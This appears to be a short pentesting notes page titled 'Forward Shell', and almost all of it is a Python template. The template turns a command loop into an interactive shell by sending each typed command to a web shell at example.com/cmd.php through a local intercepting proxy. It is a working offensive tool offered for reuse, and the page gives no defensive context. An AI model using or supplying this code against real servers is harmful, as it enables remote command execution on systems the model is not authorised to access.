---
title: "Forward Shell"
date: 2024-7-11
tags: ["Reverse Shell", "Python", "Shell", "Forward Shell", "Template"]
---

### Python Forward Shell Template

```python
#!/usr/bin/env python3

from cmd import Cmd
import requests

class Term(Cmd):
    prompt = "shell> "

    def default(self, args):
        response = requests.get("http://example.com/cmd.php", params = {"cmd": args}, proxies={"http":"http://127.0.0.1:8080"})
        print(response.text)

term = Term()
term.cmdloop()
```
